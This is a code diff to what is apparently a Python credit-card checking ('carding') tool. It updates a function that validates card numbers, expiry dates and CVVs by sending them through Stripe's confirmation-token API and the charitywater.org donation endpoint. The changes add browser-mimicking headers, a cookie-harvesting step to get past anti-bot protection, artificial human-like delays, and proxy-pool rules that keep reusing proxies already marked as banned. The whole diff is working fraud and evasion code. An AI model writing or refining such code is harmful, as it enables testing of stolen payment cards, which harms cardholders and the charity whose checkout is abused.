@@ -344,7 +344,7 @@ class ProxyPool:
 
     def get_proxy(self):
         with self.lock:
-            active = [(p, s) for p, s in self.proxies.items() if s['status'] == 'active']
+            active = [(p, s) for p, s in self.proxies.items() if s['status'] in ('active', 'banned')]
             if not active:
                 return None
             def score(s):
@@ -373,9 +373,9 @@ class ProxyPool:
             if proxy in self.proxies:
                 self.proxies[proxy]['failure'] += 1
                 fc = self.proxies[proxy]['failure']
-                if fc >= 3:
+                if fc >= 10:
                     self.proxies[proxy]['status'] = 'dead'
-                elif fc >= 2:
+                elif fc >= 6:
                     self.proxies[proxy]['status'] = 'banned'
                 update_proxy_failure(proxy)
 
@@ -1003,7 +1003,8 @@ def _cw_identity():
 
 def check_cw_gate(card_str, proxy=None):
     """
-    CharityWater card checker — 2 API calls:
+    CharityWater card checker — 3 steps:
+      0. Visit CW page (get cookies + bypass anti-bot)
       1. Stripe /v1/confirmation_tokens
       2. charitywater.org/donate/stripe
     Returns (status, reason)
@@ -1011,17 +1012,53 @@ def check_cw_gate(card_str, proxy=None):
     """
     parts = card_str.split('|')
     if len(parts) != 4:
-        return "ERROR", "صيغة خاطئة"
+        return "ERROR", "Bad card format"
     cc, month, year, cvv = parts
     if len(year) == 2:
         year = "20" + year
 
-    ident    = _cw_identity()
-    guid     = _cw_uuid(); muid = _cw_uuid(); sid = _cw_uuid()
-    cid      = str(uuid.uuid4())
-    proxy_d  = parse_proxy(proxy) if proxy else None
+    ident   = _cw_identity()
+    guid    = _cw_uuid(); muid = _cw_uuid(); sid = _cw_uuid()
+    cid     = str(uuid.uuid4())
+    proxy_d = parse_proxy(proxy) if proxy else None
+
+    # Browser-like headers shared by all requests
+    browser_headers = {
+        "User-Agent":      CW_UA,
+        "Accept-Language": "en-US,en;q=0.9",
+        "Accept-Encoding": "gzip, deflate, br",
+        "Origin":          CW_BASE,
+        "Referer":         CW_BASE + "/#give",
+        "sec-fetch-site":  "same-origin",
+        "sec-fetch-mode":  "cors",
+        "sec-fetch-dest":  "empty",
+    }
+
+    # Use a session so cookies carry between requests (critical for anti-bot)
+    sess = requests.Session()
+    sess.headers.update(browser_headers)
 
     try:
+        # ── Step 0: Visit CW page to get cookies ────────────────────────────
+        got_cookies = False
+        for _attempt in range(2):
+            try:
+                _r0 = sess.get(
+                    CW_BASE + "/#give",
+                    proxies=proxy_d, timeout=15,
+                    headers={"Accept": "text/html,application/xhtml+xml,*/*;q=0.8"},
+                    allow_redirects=True,
+                )
+                if _r0.status_code == 200 and sess.cookies:
+                    got_cookies = True
+                    break
+                time.sleep(0.5)
+            except Exception:
+                time.sleep(0.5)
+        if not got_cookies:
+            logger.warning(f"[CW] {cc[:6]}... Step0 cookie fetch failed — continuing anyway")
+        time.sleep(0.3)   # small human-like delay
+
         # ── Step 1: Stripe confirmation_token ───────────────────────────────
         stripe_data = {
             "payment_method_data[billing_details][email]":              ident["email"],
@@ -1063,14 +1100,17 @@ def check_cw_gate(card_str, proxy=None):
             "key":             CW_PK,
             "_stripe_version": CW_STRIPE_VER,
         }
-        r1 = requests.post(
+        r1 = requests.post(   # Stripe: use plain requests (not session) to avoid cookie leak
             "https://api.stripe.com/v1/confirmation_tokens",
             data=stripe_data,
             headers={
-                "Authorization": f"Bearer {CW_PK}",
-                "Content-Type":  "application/x-www-form-urlencoded",
-                "Referer":       CW_BASE,
-                "User-Agent":    CW_UA,
+                "Authorization":   f"Bearer {CW_PK}",
+                "Content-Type":    "application/x-www-form-urlencoded",
+                "Origin":          CW_BASE,
+                "Referer":         CW_BASE + "/",
+                "User-Agent":      CW_UA,
+                "Accept":          "application/json",
+                "Accept-Language": "en-US,en;q=0.9",
             },
             proxies=proxy_d, timeout=30,
         )
@@ -1138,13 +1178,15 @@ def check_cw_gate(card_str, proxy=None):
             "subscription[is_annual]": "false",
             "idempotency_key":         str(uuid.uuid4()),
         }
-        r2 = requests.post(
+        r2 = sess.post(
             f"{CW_BASE}/donate/stripe",
             data=cw_data,
             headers={
                 "Content-Type": "application/x-www-form-urlencoded",
+                "Accept":       "application/json, text/plain, */*",
                 "Referer":      CW_BASE + "/#give",
                 "User-Agent":   CW_UA,
+                "X-Requested-With": "XMLHttpRequest",
             },
             proxies=proxy_d, timeout=40,
         )
